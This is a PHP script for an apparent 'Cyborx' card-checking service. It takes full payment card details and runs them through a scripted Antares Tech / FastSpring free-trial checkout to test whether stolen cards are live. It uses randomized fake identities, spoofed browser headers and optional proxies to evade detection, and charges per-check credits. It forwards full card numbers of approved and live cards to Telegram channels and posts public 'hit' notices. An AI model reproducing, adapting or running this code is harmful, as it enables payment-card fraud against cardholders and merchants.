<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;

if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}

$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
// Fetch user details
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
    exit;
}
if ($currentCredits < 2) { // Adjusted to 2 credits for FastSpring Auth
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}
// Proxy setup from separate GET parameters
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
// Validate proxy fields
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $proxy = "http://$proxyUsername:$proxyPassword@$proxyHost:$proxyPort"; // Format for API
} else {
    $proxy = '';
}
// Restore optional proxy logic (default to off unless useProxy=1)
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
// ---------- Validate input ----------
$cc1 = $_GET['cc'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');
if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {
    echo json_encode(['Response' => 'Invalid Card Format']);
    exit;
}
// Normalize year
$yearLength = strlen($year);
if ($yearLength <= 2) {
    $year = "20" . $year;
}
// Map month to two digits
$month = sprintf('%02d', (int)$month);
// ---------- helpers ----------
function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}
function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/" . urlencode($binNumber);
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}
function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
function get_random_info() {
    $names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
    $states = ['California', 'Texas', 'New York', 'Florida', 'Illinois'];
    $state_abbr = ['CA', 'TX', 'NY', 'FL', 'IL'];
    return [
        'fname' => $names[array_rand($names)],
        'lname' => $names[array_rand($names)],
        'email' => strtolower($names[array_rand($names)]) . '@gmail.com',
        'phone' => '555' . rand(100, 999) . rand(1000, 9999),
        'add1' => rand(100, 999) . ' ' . $cities[array_rand($cities)] . ' St',
        'city' => $cities[array_rand($cities)],
        'state' => $states[array_rand($states)],
        'state_short' => $state_abbr[array_rand($state_abbr)],
        'zip' => rand(10000, 99999)
    ];
}
function gets($string, $start, $end) {
    $startPos = strpos($string, $start);
    if ($startPos === false) return '';
    $startPos += strlen($start);
    $endPos = strpos($string, $end, $startPos);
    return $endPos === false ? '' : substr($string, $startPos, $endPos - $startPos);
}
// Fetch bot token from .env
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config']);
    exit;
}
// ---------- BIN info (use its own curl handle) ----------
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
$brand = $binInfo['brand'];
$card_type = $binInfo['card_type'];
$level = $binInfo['level'];
$issuer = $binInfo['issuer'];
$country_info = $binInfo['country_info'];
curl_close($chBin);
// ---------- Request to external API (separate handle) ----------
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, tempnam(sys_get_temp_dir(), 'cookie')); // Store cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, tempnam(sys_get_temp_dir(), 'cookie')); // Reuse cookies
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
// Generate random user data
$random_data = get_random_info();
$fname = $random_data['fname'];
$lname = $random_data['lname'];
$fullname = "$fname $lname";
$email = $random_data['email'];
$phone = $random_data['phone'];
$add1 = $random_data['add1'];
$city = $random_data['city'];
$state = $random_data['state'];
$state_short = $random_data['state_short'];
$zip = strval($random_data['zip']);
$user = $fname . rand(9999, 574545);
$ua = generateUserAgent();

// First POST request to localizecdn
$headers = [
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'cache-control: no-cache',
    'content-type: text/plain;charset=UTF-8',
    'origin: https://www.antarestech.com',
    'pragma: no-cache',
    'priority: u=1, i',
    'referer: https://www.antarestech.com/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-gpc: 1',
    'user-agent: ' . $ua,
];
$data = '{"l":"en","p":{"#Checkout":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Checkout | Antares Tech":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lz-page-title"]},"#Subtotal:":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#If you don\'t cancel your free trial before it ends in 14 days, you will be automatically charged <var price=\\"\\"></var> to begin your paid monthly subscription.":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Please enter your email address to continue.":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Next":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Reset":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Create New Account":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Continue As Guest":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Get exclusive deals and updates":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Create Account":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Forgot Password?":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Login":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#Keep Shopping":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]},"#jane.doe@email.com":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-placeholder"]},"#First name":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-placeholder"]},"#Last name":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-placeholder"]},"#Password":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-placeholder"]},"#Enter Password":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-placeholder"]},"#https://antares.sfo2.cdn.digitaloceanspaces.com/product_guis/product_guis/ATU-Access-10-Stacked-300px.png":{"p":null,"u":"https://www.antarestech.com/checkout","l":["lza-src","lz-image"]},"#Remove":{"p":[],"u":"https://www.antarestech.com/checkout","l":[]}},"v":504,"cacheVersion":8644,"a":false,"ap":false,"ip":{}}';
curl_setopt($ch, CURLOPT_URL, 'https://global.localizecdn.com/api/lib/jCqhFRc3pWFHP/s');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 1',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// GET request to fetch client IP
$headers = [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Origin: https://www.antarestech.com',
    'Pragma: no-cache',
    'Referer: https://www.antarestech.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Sec-GPC: 1',
    'User-Agent: ' . $ua,
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
];
curl_setopt($ch, CURLOPT_URL, 'https://cms.antarestech.com/wp-json/antares/v1/get_client_ip');
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 2',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
$ip = $response;
// POST request to verify email
$headers = [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Origin: https://www.antarestech.com',
    'Pragma: no-cache',
    'Referer: https://www.antarestech.com/checkout',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: ' . $ua,
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
];
$json_data = [
    'email' => "$user@gmail.com",
    'cache_key' => '63c5c9be',
];
curl_setopt($ch, CURLOPT_URL, 'https://www.antarestech.com/laravel/rest/verify');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 3',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// POST request to update cart
$json_data = [
    'email' => "$user@gmail.com",
    'products' => [
        [
            'name' => 'Auto-Tune Unlimited Monthly (14 Days Free)',
            'path' => 'auto-tune-unlimited-monthly-14d-free',
            'pid' => 51001,
            'quantity' => 1,
            'thumbnail' => 'https://antares.sfo2.cdn.digitaloceanspaces.com/product_guis/product_guis/ATU-Access-10-Stacked-300px.png',
            'url' => '/products/subscriptions/unlimited/',
            'currencyFormattedFinalPrice' => '$24.99',
        ],
    ],
    'cache_key' => '63c5c9be',
];
curl_setopt($ch, CURLOPT_URL, 'https://www.antarestech.com/laravel/rest/cart-updated-ua');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 4',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// GET request to FastSpring builder
$headers = [
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: en-US,en;q=0.9',
    'cache-control: no-cache',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.antarestech.com',
    'pragma: no-cache',
    'priority: u=1, i',
    'referer: https://www.antarestech.com/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-gpc: 1',
    'user-agent: ' . $ua,
];
curl_setopt($ch, CURLOPT_URL, 'https://antarestech.onfastspring.com/embedded-production/builder');
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 5',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// POST request to FastSpring builder
$payload = [
    'items' => [
        ['path' => 'auto-tune-unlimited-monthly-14d-free', 'quantity' => 1]
    ],
    'tags' => [
        'user_id' => null,
        'user_qualifying_products' => null,
        'user_checkout_email' => "$user@gmail.com",
        'offer_tag' => null,
        'offer_code' => null,
        'promo_id' => null,
        'optin_marketing' => true
    ],
    'paymentContact' => [
        'firstName' => $fname,
        'lastName' => $lname,
        'email' => "$user@gmail.com",
        'phoneNumber' => '6365412651',
        'postalCode' => $zip
    ],
    'language' => 'en',
    'sblVersion' => '0.9.1'
];
$data = ['put' => json_encode($payload)];
curl_setopt($ch, CURLOPT_URL, 'https://antarestech.onfastspring.com/embedded-production/builder');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 6',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
$ses = gets($response, '"serial":"', '"');
if (!$ses) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error: Could not extract serial',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// POST request to finalize FastSpring builder
$data = [
    'put' => '{"origin":"https://www.antarestech.com/checkout","sblVersion":"0.9.1"}',
    'session' => $ses,
];
curl_setopt($ch, CURLOPT_URL, 'https://antarestech.onfastspring.com/embedded-production/builder/finalize');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 7',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
$response_data = json_decode($response, true);
$redurl = $response_data['url'] ?? '';
$sessionToken = $response_data['session'] ?? '';
if (!$redurl || !$sessionToken) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error: Could not extract redirect URL or session token',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// GET request to redirect URL
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.9',
    'cache-control: no-cache',
    'pragma: no-cache',
    'priority: u=0, i',
    'referer: https://www.antarestech.com/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: iframe',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: cross-site',
    'sec-fetch-storage-access: none',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $ua,
];
curl_setopt($ch, CURLOPT_URL, $redurl);
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 8',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
$token = gets($response, '"token":"', '"');
if (!$token) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error: Could not extract token',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// Final POST request to submit payment
$headers = [
    'accept: application/json, text/plain, */*',
    'accept-language: en-US,en;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json;charset=UTF-8',
    'origin: https://antarestech.onfastspring.com',
    'pragma: no-cache',
    'priority: u=1, i',
    'referer: ' . $redurl,
    'sec-ch-ua: "Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-fetch-storage-access: none',
    'sec-gpc: 1',
    'user-agent: ' . $ua,
    'x-session-token: ' . $token,
];
$json_data = [
    'contact' => [
        'email' => "$user@gmail.com",
        'country' => 'US',
        'firstName' => $fname,
        'lastName' => $lname,
        'postalCode' => $zip,
        'phoneNumber' => '6365412651',
        'region' => $state_short
    ],
    'sepa' => [
        'iban' => '',
        'ipAddress' => $ip,
    ],
    'card' => [
        'year' => $year,
        'month' => $month,
        'number' => $cc,
        'security' => $cvv,
    ],
    'ach' => [
        'routingNum' => '',
        'accountType' => '',
        'accountNum' => '',
        'confirmAccountNumber' => '',
    ],
    'mercadopago' => [
        'cpfNumber' => '',
    ],
    'paymentType' => 'card',
    'autoRenew' => true,
    'subscribe' => true,
    'recipientSelected' => false,
];
curl_setopt($ch, CURLOPT_URL, "https://antarestech.onfastspring.com/embedded-production/session/$sessionToken/payment");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
if ($proxyRequired) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Error 9',
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $currentCredits
    ]);
    exit;
}
// Process response
// $file = "cc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
// fwrite($handle, $content);
// fclose($handle);
if (
    stripos($response, '/complete') !== false
) {
    $err = 'Your Free Trial Started';
    $new_credits = updateCredits($pdo, $uid, 3, false, true);
    $fullResult =
        "<b>#FastspringAuth</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Approved ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> Fastspring Auth\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b>Approved ✅</b>\n" .
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> Fastspring Auth\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode([
        'status' => 'approved',
        'Response' => $err,
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} elseif (
    stripos($response, 'url3ds') !== false
) {
    $err = '3DS Required';
    $new_credits = updateCredits($pdo, $uid, 1, true, false);
    $fullResult =
        "<b>#FastspringAuth</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> Fastspring Auth\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} else {
    // All other responses are treated as Dead
    $err = gets($response, '"messages":[{"type":"danger","phrase":"', '"') ?: 'Unknown Response';
    $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for Dead
    echo json_encode([
        'status' => 'dead',
        'Response' => $err,
        'Gateway' => 'Fastspring Auth',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
}
curl_close($ch);
?>